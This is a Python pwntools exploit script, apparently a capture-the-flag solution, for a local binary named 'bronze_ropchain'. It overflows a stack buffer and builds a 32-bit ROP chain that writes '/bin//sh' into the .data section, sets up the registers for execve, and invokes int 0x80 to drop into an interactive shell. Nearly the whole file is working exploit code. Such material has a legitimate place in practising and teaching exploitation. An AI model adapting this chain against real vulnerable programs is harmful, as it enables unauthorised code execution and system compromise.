from pwn import *

def exploit():
    padding = 28
    p = process("./bronze_ropchain")

    payload = 'A' * 28
    #payload += p32(0x0806ef2b) # pop edx ; ret
    #payload += p32(0x080da060) # @ .data
    #payload += p32(0x080a8e86) # pop eax ; ret
    payload += p32(0x080564b4) # pop eax ; pop edx ; pop ebx ; ret
    payload += '/bin'
    payload += p32(0x080da060) # @. .data
    payload += 'AAAA'
    payload += p32(0x08056fe5) # mov dword ptr [edx], eax ; ret
    #payload += p32(0x0806ef2b) # pop edx ; ret
    #payload += p32(0x080da064) # @ .data + 4
    #payload += p32(0x080a8e86) # pop eax ; ret
    payload += p32(0x080564b4) # pop eax ; pop edx ; pop ebx ; ret
    payload += '//sh'
    payload += p32(0x080da064) # @ .data + 4
    payload += 'AAAA'
    payload += p32(0x08056fe5) # mov dword ptr [edx], eax ; ret
    payload += p32(0x0806ef2b) # pop edx ; ret
    payload += p32(0x080da068) # @ .data + 8
    payload += p32(0x080565a0) # xor eax, eax ; ret
    payload += p32(0x08056fe5) # mov dword ptr [edx], eax ; ret
    payload += p32(0x080481c9) # pop ebx ; ret
    payload += p32(0x080da060) # @ .data
    payload += p32(0x0806ef52) # pop ecx ; pop ebx ; ret
    payload += p32(0x080da068) # @ .data + 8
    payload += p32(0x080da060) # padding without overwrite ebx
    payload += p32(0x0806ef2b) # pop edx ; ret
    payload += p32(0x080da068) # @ .data + 8
    payload += p32(0x080565a0) # xor eax, eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x0807c3ba) # inc eax ; ret
    payload += p32(0x080495b3) # int 0x80


    log.info("Payload's length: {}".format(len(payload)))
    log.info("Payload : {}".format(payload))
    p.sendline(payload)
    #gdb.attach(p,"""
    #            b *greet+68
    #            c
    #            """)
    p.interactive()

if __name__ == "__main__":
    exploit()